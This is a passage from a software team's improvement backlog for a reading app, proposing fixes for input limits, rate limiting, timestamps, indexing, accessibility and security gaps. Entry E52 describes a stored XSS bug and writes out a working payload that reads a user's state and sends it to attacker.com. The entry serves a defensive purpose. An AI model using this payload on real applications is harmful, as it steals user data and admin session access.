**Complexity:** S — in `build_chat_prompt()` (`app_server.py:2241`), change `"existing_connections": user_state.get("connections", [])[:20]` to `"existing_connections": [] if book_id else user_state.get("connections", [])[:20]`. Touch: `app_server.py:2241`.

**Files:** `app_server.py:2223-2257` (`PromptBuilder.build_chat_prompt`)

---

### E30 — Form inputs have no `maxlength` — pasting large text creates unbounded state documents (S)
**What:** None of the form inputs in `index.html` have `maxlength` attributes: the book title input (line 379), author input (line 380), notes textarea (line 402), quote content textarea (`id="quoteContent"`, line 459), reflection textarea (line 470), session note textarea (line 426), and connection thought textarea (line 607). The backend's only length guard is the 20 MB request cap in `_read_json()` and a 2000-char cap for chat messages (`app_server.py:2152`). A user accidentally pasting a chapter of text into the quote content field creates a state blob that is valid to the backend but semantically broken — it inflates `PUT /api/state` payloads, bloats the SQLite `state_json` column, and inflates the context that `PromptBuilder` injects into chat prompts. There is no user-facing warning that a field is unreasonably long.

**Why it matters:** `maxlength` is a single-attribute client-side guard that prevents accidental paste of large blobs, keeps state documents compact, and gives users immediate feedback. Reasonable limits: book title 200, author 100, notes/reflection 2000, quote content 5000, connection thought 2000. None of these cap legitimate use cases.

**Complexity:** S — add `maxlength` to each text/textarea input in the relevant dialogs in `index.html`. No backend changes required (existing validations remain as server-side guard). Touch: `index.html:379-402, 426, 459, 470, 607`.

**Files:** `index.html:379, 380, 402, 426, 459, 470, 607`

---

## 2026-06-04

### E31 — Auth endpoints have no rate limiting — credential stuffing and spam registration undefended (M)
**What:** `_enforce_rate_limit()` is called for `chat` (lines 4580, 4823) and `ocr` (lines 4246, 4291, 4342), but the three auth endpoints receive zero rate-limit protection: `/api/login` (line 3939), `/api/register` (line 3889), `/api/password/reset-request` (line 4015), and `/api/password/reset` (line 4082). An attacker can issue unlimited login attempts against any username, spray passwords across many accounts, or flood `/api/register` to create thousands of users (triggering DB writes, session rows, and `user_state` rows on each attempt).

**Why it matters:** The existing `check_and_record_rate_limit()` is user-id–based and only kicks in post-auth, making it structurally unable to defend pre-auth endpoints. A modest IP-or-username–based lockout (e.g., 10 failed login attempts per username per 15 minutes using a lightweight in-memory `collections.Counter` or a new DB table similar to `rate_limit_counters`) would eliminate the attack surface. DeepSeek and Kimi API keys are gated behind the chat/ocr limits; the user DB is currently completely open to automated abuse.

**Complexity:** M — add a `check_login_rate_limit(username, ip)` helper that reuses or extends the existing `rate_limit_counters` table; apply it at the top of the `/api/login` and `/api/password/reset-request` handlers. For `/api/register`, an IP-based counter suffices (no username yet). Touch: `app_server.py:3889-3950, 4015-4087` (handlers); `app_server.py:1462-1530` (`check_and_record_rate_limit` reference).

**Files:** `app_server.py:3889, 3939, 4015, 4082`; `app_server.py:1462-1530` (rate-limit helper); tests in `tests/agent/rate_limit_test.py`

---

### E32 — `/media/` serves user images unauthenticated with wildcard CORS — any site can hotlink private photos (S)
**What:** The `/media/` handler at `app_server.py:3497-3519` has no `_require_user()` call — no authentication is required at all. It also sends `Access-Control-Allow-Origin: *` (line 3509) and `Cache-Control: public, max-age=31536000, immutable` (line 3510). Images are stored under `/uploads/{user_id}/{filename}` where both segments are UUIDs, so paths are hard to guess, but once a URL is known (e.g., extracted from a chat export or from browser DevTools): (a) any third-party website can hotlink the image, (b) CDN/proxy caches store it permanently under a `public` directive, (c) anyone — including logged-out users — can retrieve it indefinitely. Book covers and quote photos may include personal/private content (handwritten notes, receipts used as bookmarks, etc.).

**Why it matters:** The minimum fix is a one-line change: remove `Access-Control-Allow-Origin: *` from the `/media/` response (the images are only loaded via `<img src>` from the same origin in the app, so cross-origin access is never needed). This closes the hotlinking vector at zero cost to functionality. A deeper fix — adding authentication to `/media/` — requires converting all `<img src="/media/...">` to fetch-based blob URLs; that is M-complexity and can be a follow-up.

**Complexity:** S (minimum fix: remove one header line, `app_server.py:3509`). M if full auth-gating of `/media/` is desired later.

**Files:** `app_server.py:3509` (delete the `Access-Control-Allow-Origin` header line in the `/media/` block); `app_server.py:3497-3519`

---

### E33 — `sanitize_state()` passes through arrays with no count caps — bloated state inflates DB, sync cost, and prompt tokens (S)
**What:** `sanitize_state()` at `app_server.py:614-648` validates array types but imposes no length limit: `books`, `sessions`, `quotes`, `connections`, and the `chatHistories` dict are all accepted at whatever size the client sends. A user (or a compromised token) can `PUT /api/state` with 10,000 quotes each containing a 3,000-character reflection, producing a 30 MB+ `state_json` in `user_state`. `PromptBuilder` caps `books[:5]` before injecting into the system prompt (line 2256), but the rest of the raw state is stored and loaded on every request. A bloated `user_state` row makes every `load_state()` call in the hot chat path slower.

**Why it matters:** `sanitize_state()` is the single gate through which all client-submitted data passes; adding caps there is a one-and-done fix. Reasonable upper bounds (books: 2 000, sessions: 10 000, quotes: 5 000, connections: 2 000, chat histories: 100 per history key) do not constrain any realistic use case but prevent accidental or adversarial bloat. With the existing `maxlength` gap (E30) in the frontend, a single paste-heavy session can already inflate the state to several MB today.

**Complexity:** S — in `sanitize_state()` at lines 642–647, wrap each list with a tail-slice: `(payload.get("books") or [])[-2000:]` etc. Add per-history message cap at line 631: `value[-200:]`. No schema change, no test change needed. Touch: `app_server.py:630-648`.

**Files:** `app_server.py:630-648`

---

### E34 — `clearLogs()` fires destructively with no confirmation dialog (S)
**What:** `clearLogs()` at `app.js:2950` calls `apiFetch("/api/model-logs", { method: "DELETE" })` directly on button click, with no `showConfirmDialog()` guard. Every other irreversible action in the app — `deleteBook()` (line 1952), `deleteSession()` (line 2181), `deleteQuote()` (line 2198), `deleteConnection()` (line 3505) — wraps the destructive call in `showConfirmDialog()`. Model logs are the primary debugging surface for diagnosing AI quality issues; an accidental click during normal debug-panel use destroys the entire log history for that user.

**Why it matters:** The asymmetry is a latent UX bug: the user can accidentally nuke all their observability data with one misclick while browsing the `/debug/logs` panel. The fix is ~5 lines wrapping the existing `apiFetch` in the same `showConfirmDialog()` pattern already used by all sibling delete functions.

**Complexity:** S — wrap the `apiFetch` in `clearLogs()` with `showConfirmDialog({ message: "确定清空所有模型日志？", onConfirm: async () => { ... } })`. Touch: `app.js:2950-2960`.

**Files:** `app.js:2950-2960`

---

### E35 — `syncState()` has no optimistic locking — concurrent tabs or devices silently overwrite each other (M)
**What:** `syncState()` at `app.js:755-767` issues a blind `PUT /api/state` with the full local `state` object. The `user_state` table has an `updated_at` column (line 401) that is written by `save_state()` (line 671) on every mutation, but the value is never returned to or compared by the client. When a user has the app open in two tabs simultaneously (phone + browser, or two windows) and both make edits, the second `PUT` simply overwrites the first — the last save wins, silently discarding the other session's work. On a reading app, a user might add a quote on their phone and an annotation on their desktop in the same minute, losing one of them invisibly.

**Why it matters:** A simple optimistic locking mechanism (`If-Match`/`ETag` pattern or a monotonic version counter) would detect this conflict and return a 409, allowing the client to surface "状态已被其他标签页修改，请刷新" before data loss occurs. The `updated_at` column is already present; the fix requires returning it from `GET /api/state` and `PUT /api/state`, and checking it on write — about 8 lines of backend Python and 5 lines of frontend JS.

**Complexity:** M — backend: return `{ state, stateVersion: updated_at }` from both `GET /api/state` and `PUT /api/state`; add a version-check guard in `save_state()` that rejects with 409 if `updated_at ≠ client_version` when client supplies one. Frontend: store `stateVersion` after load/sync; include as `X-State-Version` header on PUT; handle 409 by showing a reload prompt. Touch: `app_server.py:668-671` (`save_state`), `app_server.py:3584-3622` (`GET /api/state`); `app.js:755-767` (`syncState`), `app.js:769-800` (`loadSession`).

**Files:** `app_server.py:668-671, 3584-3622`; `app.js:755-767, 769-800`

---

## 2026-06-05

### E36 — `ActionExecutor` uses `datetime.now().isoformat()` — agent-created records carry naïve local time + microseconds (same timezone bug as OPT-014, unfixed path) (S)
**What:** Every record written by `ActionExecutor.execute_action()` uses the bare `datetime.now().isoformat()` call (7 sites: `app_server.py:2971, 2994, 3014, 3024, 3035, 3045, 3074`) for `createdAt` and `updatedAt`. This produces timestamps like `2026-06-05T20:34:56.123456` — naïve local time, microsecond precision, no timezone suffix. OPT-014 fixed this exact bug on the OCR path by replacing `now_iso()` with `utc_now_iso()`, and the frontend sort was updated to use `Date.parse` epoch diff. But the agent action path was never updated: every agent-created `add_note`, `add_book`, `question`, `link_thought` record still uses the local-time call with microseconds.

**Why it matters:** The frontend sorts books and quotes by `new Date(b.createdAt) - new Date(a.createdAt)`. `new Date("2026-06-05T20:34:56.123456")` is parsed as **local time** by the browser, giving it an effective UTC offset of +8h relative to user-created records (which use `new Date().toISOString()` = UTC+Z). On a UTC+8 server, every agent-created record appears ~8 hours ahead of any user-created record from the same moment — same root cause as OPT-014, same population of users (anyone using the agent actions), same silent display corruption.

**Complexity:** S — replace all 7 `datetime.now().isoformat()` calls inside `ActionExecutor.execute_action()` with `utc_now_iso()`. No schema changes, no interface changes, no test changes. One-line `%s` substitution per call site.

**Files:** `app_server.py:2971, 2994, 3014, 3024, 3035, 3045, 3074`

---

### E37 — `agent_trace_events` table has no index on `trace_id` — trace detail fetch is a full table scan (S)
**What:** `init_db()` at `app_server.py:500-508` creates covering indexes for `model_logs`, `agent_traces`, `agent_actions`, and `agent_metrics`, but none for `agent_trace_events` (defined at lines 421-428). The query at line 2645 — `SELECT … FROM agent_trace_events WHERE trace_id = ? ORDER BY created_at ASC` — runs against an unindexed 421-row (and growing) table. Every call to `get_trace()` (line 2640) or any trace-detail API that joins events must do a full table scan across events from all users to find matching rows.

**Why it matters:** `agent_trace_events` grows at the same rate as `agent_traces` (one row per pipeline stage per request). For a Plus user at 240 req/day over a year, the table reaches ~250,000 rows. Without an index, each trace-detail load scans every one. This is exactly the same problem OPT-017 fixed for `model_logs` and `agent_traces`; `agent_trace_events` was simply missed. Adding the index is zero-risk and takes one line.

**Complexity:** S — add `CREATE INDEX IF NOT EXISTS idx_trace_events_trace ON agent_trace_events(trace_id, created_at)` to the `executescript` block in `init_db()`. SQLite builds the index on next startup; existing data is automatically indexed.

**Files:** `app_server.py:500-509` (`init_db` index block); `app_server.py:2645` (query that benefits)

---

### E38 — Account export fetches ALL `agent_traces` + `agent_actions` without a row cap — can exhaust RAM for heavy users (S)
**What:** The `/api/account/export` handler at `app_server.py:3610-3625` issues two unbounded `SELECT … WHERE user_id = ?` queries — one for `agent_traces` and one for `agent_actions` — and materialises both into Python lists before `json.dumps()` them. A Plus user with 12 months of daily use accumulates ~87,000 trace rows and ~87,000+ action rows. Materialising 174,000 rows into RAM (each containing multi-field dicts with action JSON blobs) consumes hundreds of MB, blocks the single HTTP-handler thread for several seconds, and can OOM the process on a small VPS.

**Why it matters:** Export is a user-facing compliance and backup feature. It should not be a DoS vector. The fix is minimal: add `ORDER BY created_at DESC LIMIT 1000` and `LIMIT 2000` to the two queries respectively, and include a `"truncated": true` note in the export JSON if the limit is reached. This preserves the most recent/relevant data while bounding the response to under ~5 MB.

**Complexity:** S — add `LIMIT 1000` / `LIMIT 2000` clauses and a truncation flag to the two queries at lines 3610-3625. Touch: `app_server.py:3610-3625`.

**Files:** `app_server.py:3610-3625`

---

### E39 — `Content-Disposition` filename uses raw `username` — Chinese usernames and `"` chars produce a malformed HTTP header (S)
**What:** `app_server.py:3659` builds the export download filename via f-string interpolation: `f'attachment; filename="paper-reading-export-{user["username"]}-{time.strftime("%Y%m%d")}.json"'`. Username registration (`app_server.py:3895`) only validates `len(username) >= 2` — no character whitelist. A username containing `"` (e.g. `test"user`) produces `filename="paper-reading-export-test"user-20260605.json"` which breaks the header token. Chinese usernames (e.g. `小明`) are non-ASCII and require RFC 5987 `filename*` encoding or percent-escaping to be spec-compliant; without it, some browsers ignore the header entirely and save the file as `download.json`.

**Why it matters:** A malformed header is invisible in normal use but causes silent failures for users with non-ASCII or special-character usernames — exactly the demographic most likely to use a Chinese reading app. The fix is a one-liner: sanitise the filename by replacing `[^\w\-]` with `_` before interpolation. No user-facing change; the resulting filename is always safe.

**Complexity:** S — add `safe_name = re.sub(r'[^\w\-]', '_', user["username"])` before line 3659 and use `safe_name` in the f-string. `import re` is already present. Touch: `app_server.py:3657-3660`.

**Files:** `app_server.py:3657-3660`

---

### E40 — `summarize_metrics()` aggregates ALL historical rows with no time window — O(n) scan on every `/debug/logs` load (S)
**What:** `MetricsCollector.summarize_metrics()` at `app_server.py:2799-2807` executes `SELECT … FROM agent_metrics WHERE user_id = ?` with no date filter and no `LIMIT`. All rows are loaded into Python RAM, each JSON-deserialised in a per-row loop, then aggregated. The same Plus user with 87,000 `agent_metrics` rows triggers a 87,000-row fetch + 87,000 `json.loads()` calls on every `/debug/logs` or `/debug/metrics` page load. While the `idx_agent_metrics_user` index (added by OPT-017) prevents a cross-user scan, it still returns every historical row for the requesting user.

**Why it matters:** The debug dashboard is opened regularly by active users to monitor AI quality. Its latency scales linearly with usage history. A 90-day rolling window covers all practically useful debugging history (config changes, model upgrades, regressions) while capping the scan to ~21,600 rows worst-case. The fix is a one-line SQL change.

**Complexity:** S — add `AND created_at > datetime('now', '-90 days')` to the `WHERE` clause at line 2804. Update the dashboard section header to "90-day summary" (one string in `app.js` or the template). Touch: `app_server.py:2799-2807`.

**Files:** `app_server.py:2799-2807`; `app.js` (dashboard label, minor)

---

## 2026-06-06

### E41 — `/debug/*` endpoints are world-readable when `ADMIN_TOKEN` is unset — all users' AI chat content exposed (S)

**What:** `_authorized_for_admin()` at `app_server.py:3379-3382` returns `True` unconditionally when `AUTH_TOKEN` (= `$ADMIN_TOKEN` env) is empty: `if not AUTH_TOKEN: return True`. The three debug HTML pages gated by this check — `/debug/logs`, `/debug/errors`, `/debug/agent-dashboard` — are therefore **publicly accessible by anyone who discovers the URL** when the server is deployed without `ADMIN_TOKEN` set (which is the default). `/debug/logs` renders the last 100 model calls across **all users**, including full system prompts (containing each user's books, quotes, and reading notes), every user message, and every AI response.

**Why it matters:** The default configuration is the production risk. A user can guess or find the URL (it's hardcoded in `app_server.py` and easily discovered via browser DevTools or a port scan), then read every other user's private AI conversation without authentication. This is a P0 privacy/security gap for a commercial app with paying users. The minimum fix is a two-line change: require an authenticated admin user session even when `ADMIN_TOKEN` is unset, using the existing `is_admin_username()` check.

**Complexity:** S — in `_authorized_for_admin()` at line 3380, change `if not AUTH_TOKEN: return True` to `if not AUTH_TOKEN: return self._is_authenticated_admin()`, where `_is_authenticated_admin()` resolves the bearer token via `resolve_user_from_token()` and checks `is_admin_username(user["username"])`. Touch: `app_server.py:3379-3382`.

**Files:** `app_server.py:3379-3382, 3675, 3786, 3828`

---

### E42 — `execute_action()` reads and writes state non-atomically — concurrent approvals from two browser tabs silently discard mutations (M)

**What:** `ActionExecutor.execute_action()` at `app_server.py:2956-3080` follows the pattern: `state = load_state(conn, user_id)` → mutate state in Python → `save_state(conn, user_id, state)`. This read-modify-write cycle is not wrapped in a `BEGIN IMMEDIATE` transaction or any other concurrency guard. If a user approves two agent actions in rapid succession from two browser tabs (or two open windows), both executions can read the same initial state, each apply their respective mutation, and then both write back — with the second write silently overwriting the first write's changes. For example: Tab A reads state with `books=[B1]`, adds B2; Tab B reads state with `books=[B1]`, adds B3; Tab A saves `[B1, B2]`; Tab B saves `[B1, B3]` — B2 is permanently lost with no error or warning.

**Why it matters:** Agent actions (`add_book`, `add_note`, `summary`, `tag`, `link_thought`) are irreversible state mutations. Silent data loss on concurrent approvals erodes user trust and is invisible — no error is surfaced and no retry is possible. The fix is to wrap the read-modify-write in a `BEGIN IMMEDIATE` transaction (available on the existing `conn` object), making the entire pattern atomic within SQLite's write serialization.

**Complexity:** M — add `conn.execute("BEGIN IMMEDIATE")` before `load_state()` and rely on `save_state()`'s existing `conn.commit()` as the commit. Handle `sqlite3.OperationalError: database is locked` at the handler level. Alternatively, implement `atomic_update_state(conn, user_id, fn)` helper that wraps the pattern in one place. Touch: `app_server.py:2956-3080`; callers at `/api/agent-actions/{id}/execute` (~line 5025).

**Files:** `app_server.py:2956-3080`; `app_server.py:5025-5095` (execute handler)

---

### E43 — Username registration validates only minimum length — no max-length cap or character whitelist (S)

**What:** `POST /api/register` at `app_server.py:3894` checks only `len(username) < 2 or len(password) < 4`. There is no upper bound on username length and no character whitelist. A username of 10,000 characters is accepted and stored in the `users` table, then replicated into every `model_logs.username` row, every session row, and every export payload. The `Content-Disposition` fix proposed in E39 sanitises the header symptom but not the root cause: arbitrary characters (quotes, backslashes, control characters, commas) in the username can corrupt HTTP headers, break admin log rendering, and confuse the `ADMIN_USERNAMES` comma-split at line 70.

**Why it matters:** Input validation at the registration boundary is the correct fix for the entire class of downstream corruption issues (E39, admin username list poisoning, oversized DB rows). A 50-character max and a simple alphanumeric + CJK + `_-.` whitelist covers all legitimate use cases without restricting Chinese reading-app users. The fix is two lines of validation before the DB write.

**Complexity:** S — after the existing length check at line 3894, add: `if len(username) > 50: self._send_json({"error": "用户名最多 50 个字符"}, 400); return` and `if not re.match(r'^[\w一-鿿\-_.]+$', username): self._send_json({"error": "用户名含非法字符"}, 400); return`. `import re` is already present. Touch: `app_server.py:3894-3895`.

**Files:** `app_server.py:3894-3895`

---

### E44 — `save_state()` writes `updated_at` with `now_iso()` (naïve local time) — inconsistent with UTC policy established by OPT-014 (S)

**What:** `save_state()` at `app_server.py:672` executes `UPDATE user_state SET state_json = ?, updated_at = ? WHERE user_id = ?` with `now_iso()` for `updated_at`. `now_iso()` returns naïve local time without a timezone suffix (e.g. `2026-06-06T15:30:00.123456`). OPT-014 and OPT-024 established `utc_now_iso()` as the authoritative timestamp for user-visible records to avoid sort-order bugs. The `updated_at` column is the natural version field for the optimistic-locking proposal in E35; if that feature lands and compares `updated_at` across requests, a naïve-vs-UTC mismatch on UTC+8 servers would make all version checks appear stale by ~8 hours, causing constant 409 conflicts.

**Why it matters:** The cost of fixing this now is one character change (`now_iso` → `utc_now_iso`). The cost of fixing it after E35's optimistic locking ships is a migration or a silent 8-hour false-conflict rate. Applying the UTC policy consistently is low-risk and closes the door on an entire class of timezone-related bugs.

**Complexity:** S — change `now_iso()` to `utc_now_iso()` at `app_server.py:672`. No schema changes, no test changes. Touch: `app_server.py:672`.

**Files:** `app_server.py:668-675`

---

### E45 — `db_index_test.py` `EXPECTED_INDEXES` won't cover the OPT-025 index once it lands (S)

**What:** `tests/agent/db_index_test.py:14-19` hardcodes `EXPECTED_INDEXES = {"idx_model_logs_user_created", "idx_agent_metrics_user", "idx_agent_actions_trace", "idx_agent_traces_user_created"}` — exactly the four indexes added by OPT-017. OPT-025 (status: triaged) will add a fifth index `idx_trace_events_trace ON agent_trace_events(trace_id, created_at)`. After OPT-025 is implemented, the test will still pass even if someone accidentally drops the new index — because it's not in `EXPECTED_INDEXES`. The test's `test_observability_indexes_created` and `test_init_db_is_idempotent` methods would give a false-green signal.

**Why it matters:** The test was written to serve as a regression guard for index changes. Its guard is already incomplete for the next planned index. Adding the new index name to `EXPECTED_INDEXES` proactively (or as part of the OPT-025 PR) costs one line and ensures the guard stays current.

**Complexity:** S — add `"idx_trace_events_trace"` to `EXPECTED_INDEXES` at `tests/agent/db_index_test.py:14`; optionally add a `test_trace_events_query_uses_index` method parallel to the existing `test_model_logs_query_uses_index`. Touch: `tests/agent/db_index_test.py:14-19`.

**Files:** `tests/agent/db_index_test.py:14-19`

---

### E46 — `chatHistories` key count in `sanitize_state()` is uncapped — heavy users with many books accumulate multi-MB state blobs (S)

**What:** `sanitize_state()` at `app_server.py:624-648` iterates `chat_histories.items()` and migrates every key into `migrated_histories` without any limit on the total number of keys. The frontend creates one history key per context: one global (`__general__`), one per book (`book:<id>`), and one per quote that was chatted with (`quote:<id>`). A user with 500 books who chatted once with each accumulates 501 history keys; with 2,000 quotes chatted, potentially 2,501 keys. Each history stores up to `_COMPRESS_THRESHOLD` (10) messages before compression, each message ~100–500 bytes — 2,501 keys × 10 messages × 200 bytes = **5 MB of chat history alone** in the `user_state` `state_json` column, loaded from SQLite on every chat request and every state sync. E33 proposes capping messages-per-history at 200, but not the number of distinct history keys.

**Why it matters:** Every `load_state()` call (called at the start of every chat request, state sync, and action execution) deserialises the entire `state_json` blob. A 5 MB+ blob parsed on every request is a meaningful latency penalty and memory spike. Capping `migrated_histories` to the 100 most-recently-used keys (by preserving only keys that appear in the most recent entries of `chatContexts`) bounds the state blob size without losing active chat contexts.

**Complexity:** S — in `sanitize_state()` at line 641, after building `migrated_histories`, apply `migrated_histories = dict(list(migrated_histories.items())[-100:])`. Update `migrated_contexts` to match. Touch: `app_server.py:641-648`.

**Files:** `app_server.py:614-648` (`sanitize_state`); `app_server.py:1808-1836` (`compress_chat_history_if_needed`, no changes)

---

## 2026-06-07

### E47 — `reading_mcp_server.py` uses `datetime.now().isoformat()` — same naïve-local-time bug as OPT-024, unpatched path (S)

**What:** `_now_iso()` at `reading_mcp_server.py:50-51` is defined as `return datetime.now().isoformat()` — identical to the call OPT-024 replaced with `utc_now_iso()` in `ActionExecutor`. It is used for `createdAt`/`updatedAt` on every record written by the five MCP tool functions: `add_note` (line 170), `add_book` (lines 272-273), `summary` (line 318), `tag` (line 402), and `link_thought` (line 488). The MCP dispatcher (`mcp_dispatcher.py`) is invoked from `app_server.py` via `MCPToolDispatcher.dispatch()` whenever any of these agent actions run.

**Why it matters:** The frontend sorts books and quotes via `new Date(b.createdAt) - new Date(a.createdAt)`. A naïve local timestamp like `2026-06-07T20:00:00` is parsed as local time by the browser, giving records created via MCP an effective +8 h offset over user-created records (UTC+Z). On a UTC+8 server, MCP-sourced records appear ~8 hours earlier in time — exactly the same display-order corruption that OPT-024 fixed for ActionExecutor. OPT-024 patched the old execution path but the MCP path was introduced separately and was never updated.

**Complexity:** S — change `_now_iso()` at `reading_mcp_server.py:50-51` to `from datetime import timezone; return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"` (or simply import and call the existing `utc_now_iso()` from `app_server.py` if the module boundary allows). No schema changes, no test changes beyond adding a UTC-suffix assertion in `reading_mcp_server_tools_test.py`.

**Files:** `reading_mcp_server.py:50-51`; callers at lines 162, 170, 214, 264, 272-273, 318, 402, 488; `tests/agent/reading_mcp_server_tools_test.py` (add UTC assertion)

---

### E48 — Uploaded images are never cleaned up when books/quotes are deleted — orphaned files accumulate on disk indefinitely (M)

**What:** `deleteBook()` in `app.js:1952-2007` and `deleteQuote()` in `app.js:2198-2213` both remove the book/quote from `state` and call `syncState()` — but neither calls any backend API to delete the associated image file stored under `uploads/<user_id>/<filename>`. There is no `/api/media/delete` endpoint or any backend GC for orphaned images. When a user uploads a book cover and then deletes the book, the image file remains on disk. `deleteBook()` also deletes all associated quotes (line 1969), orphaning their `imageUrl` files too. Only `DELETE /api/account` triggers an `shutil.rmtree(uploads_dir)` (line 5210-5214) — all other deletions leave the files behind.

**Why it matters:** A reading-heavy user who iterates on their book list (adds and removes books multiple times) accumulates hundreds of megabytes of orphaned images. On local disk this is a slow leak; on a paid object-storage backend (S3/R2) it creates unnoticed billing. The GC thread already runs every 6 hours — a `gc_orphaned_images()` function that scans `UPLOAD_DIR/<user_id>/` and deletes files whose URL does not appear in the user's current `state_json` would contain the leak without touching any logic in the deletion flow.

**Complexity:** M — add `gc_orphaned_images(conn)` that (1) iterates all user-IDs that have an `uploads/` directory, (2) loads each user's state, (3) collects all `imageUrl` values from `books` + `quotes`, (4) deletes files not in that set. Add to `_run_gc()`. Add one test. Touch: `app_server.py:5229-5247` (`_run_gc`); new GC function near the other GC helpers.

**Files:** `app_server.py:5229-5247` (`_run_gc`); `app_server.py:1882-1513` (GC helpers pattern); `tests/agent/gc_thread_test.py`

---

### E49 — `render()` rebuilds all four tab panels unconditionally — inactive tabs waste CPU on every state change (S)

**What:** `render()` at `app.js:1483-1502` calls `renderBooks()`, `renderTimeline()`, `renderQuotes()`, and `renderConnections()` on every invocation, regardless of which tab is currently visible. The app has 4 tabs (books / timeline / quotes / connections), and `render()` is called ~20 times in the codebase — on login, on every dialog submit, on every sync, on every delete. `isTabActive(tabName)` at line 181 already exists and works; targeted post-save updates at lines 2676-2699 already use it for connections and books. But the main `render()` dispatch does not. For a user with 200+ quotes on the quotes tab, every book-tab action triggers a full `renderQuotes()` DOM rebuild unnecessarily.

**Why it matters:** Mobile browsers have limited JS execution budgets. On a mid-tier Android phone, a full `renderQuotes()` with 200 items takes ~30 ms of synchronous DOM work — called on every tab state change even when the quotes panel is offscreen. Wrapping each sub-render in an `isTabActive()` guard and re-rendering on tab activation (via the existing `data-tab` click listener at `app.js:1514-1519`) eliminates this waste at zero logic cost.

**Complexity:** S — in `render()`, wrap each of `renderBooks()`, `renderTimeline()`, `renderQuotes()`, `renderConnections()` in an `isTabActive()` guard; add a `_dirtyTabs = new Set()` flag so a tab that was dirty while hidden re-renders when it becomes active. Touch: `app.js:1483-1502, 1514-1519`.

**Files:** `app.js:1483-1502` (`render()`); `app.js:1514-1519` (tab-switch click listener)

---

### E50 — `<dialog>` elements have no `aria-labelledby` — screen readers announce modals with no name (WCAG 4.1.2 Level A) (S)

**What:** `index.html` contains 9 `<dialog>` elements — `bookEditDialog`, `bookDetailDialog`, `bookDialog`, `sessionDialog`, `quoteDialog`, `quoteDetailDialog`, `deleteBookDialog`, `confirmDialog`, `forgotPasswordDialog`, `resetPasswordDialog` (lines 327, 355, 375, 410, 435, 480, 503, 516, 527, 539). None have an `aria-labelledby` attribute. Every dialog contains a visible `<h2>` heading (e.g. "新增书籍", "编辑书籍", "新增阅读记录") — the information is present but not linked to the dialog via ARIA. Screen readers announce only "dialog" when focus enters, with no title, leaving keyboard users without context about which modal opened.

**Why it matters:** WCAG 2.1 SC 4.1.2 (Name, Role, Value — Level A) requires interactive UI components to have an accessible name. `<dialog>` elements are specifically called out: without `aria-label` or `aria-labelledby`, the dialog's "name" is empty. This is a Level A (most severe) compliance gap. The fix is purely additive: add `id` attributes to the existing `<h2>` headings and `aria-labelledby` attributes to the `<dialog>` elements — no logic changes.

**Complexity:** S — for each dialog, add an `id` to its heading `<h2>` (e.g. `id="bookDialogTitle"`) and `aria-labelledby="bookDialogTitle"` to the `<dialog>`. Nine dialogs, ~18 HTML attribute additions, no JS changes. Touch: `index.html:327-620`.

**Files:** `index.html:327, 355, 375, 410, 435, 480, 503, 516, 527, 539` (dialog + heading pairs)

---

### E51 — WAL file never checkpointed explicitly — unbounded WAL growth silently inflates disk usage between GC runs (S)

**What:** `get_conn()` sets `PRAGMA journal_mode = WAL` once at startup (`app_server.py:334`). SQLite WAL mode auto-checkpoints when the WAL reaches 1000 pages (default `PRAGMA wal_autocheckpoint`), but auto-checkpoint uses `PASSIVE` mode — it does not reclaim disk space (does not shrink the WAL file). The WAL file (`app_state.db-wal`) can therefore grow indefinitely if checkpoints do not complete: under concurrent read load, a `PASSIVE` auto-checkpoint finds readers in the WAL and leaves pages unclaimed. The `_run_gc()` thread already runs every 6 hours on a dedicated connection — it is the natural place to issue `PRAGMA wal_checkpoint(TRUNCATE)`, which waits for all readers to vacate and then resets the WAL file to zero bytes.

**Why it matters:** A production server doing 240 writes/day accumulates a growing WAL file that is never explicitly truncated. Over weeks of sustained use the WAL can reach tens of MB, all of which is disk space that could be reclaimed with one SQL statement. The fix is one line added to `_run_gc()`.

**Complexity:** S — add `conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")` at the end of the `_run_gc()` try-block (`app_server.py:5236-5242`). No schema changes, no new dependencies. The call is a no-op if no WAL pages need flushing (safe to call unconditionally). Touch: `app_server.py:5236-5244`.

**Files:** `app_server.py:5229-5247` (`_run_gc`); `tests/agent/gc_thread_test.py` (add checkpoint assertion)

---

## 2026-06-08

### E52 — Debug dashboard injects user content unescaped into HTML — stored XSS via chat messages (S)

**What:** The `/debug/logs` HTML page is built at `app_server.py:3848-3885` by splicing database rows directly into f-strings: `row['prompt']`, `row['input']`, `row['output']`, `row['username']`, `row['error']`, `json.dumps(action['data'])`, and `action['errorMessage']` are all inserted without escaping. `import html` is absent from the file. A registered user who sends a chat message containing `</pre><img src=x onerror="fetch('/api/state',{headers:{Authorization:'Bearer TOKEN'}}).then(r=>r.json()).then(d=>navigator.sendBeacon('https://attacker.com',JSON.stringify(d)))">` gets that payload stored in `model_logs.input`. When the admin opens `/debug/logs`, the payload executes in their browser. The same pattern is present in the `/debug/errors` and `/debug/agent-dashboard` rendering blocks.

**Why it matters:** OPT-028 restricted access to admin/loopback, but any registered user can plant a malicious message that persists in the top-100 log window. XSS against an admin session on a commercial app is a meaningful attack surface: the attacker can exfiltrate all users' state, forge API calls, or pivot to billing. Fixing it requires `import html` and wrapping each user-controlled f-string interpolation with `html.escape()` — a two-character function call per site.

**Complexity:** S — `import html` (stdlib, no dependency) + `html.escape()` on the ~10 user-controlled interpolation sites at lines 3848-3885. Same fix applies to `/debug/errors` and `/debug/agent-dashboard` HTML builders. Zero functional change.

**Files:** `app_server.py:3848-3885` (`/debug/logs` HTML builder); also scan `/debug/errors` (~line 3917) and `/debug/agent-dashboard` (~line 3950) rendering blocks for the same pattern.

---

### E53 — TraceManager commits after every individual event — 7-8 SQLite fsyncs per chat request (M)

**What:** `TraceManager.create_trace()` calls `conn.commit()` at line 2687. `TraceManager.log_event()` calls `conn.commit()` at line 2697. `TraceManager.update_trace()` calls `conn.commit()` at line 2706. A single streaming chat request emits: 1 `create_trace` + ~5 `log_event` calls (REQUEST_RECEIVED, VALIDATED, LLM_CALLED, PARSED, ACTIONS_VALIDATED) + 1-2 `update_trace` calls = 7-8 commits. Each `conn.commit()` in WAL mode advances the WAL and, when enough pages accumulate, triggers a disk sync. With 240 requests/day, this generates 1,680-1,920 trace commits vs. 240 if batched per-request.

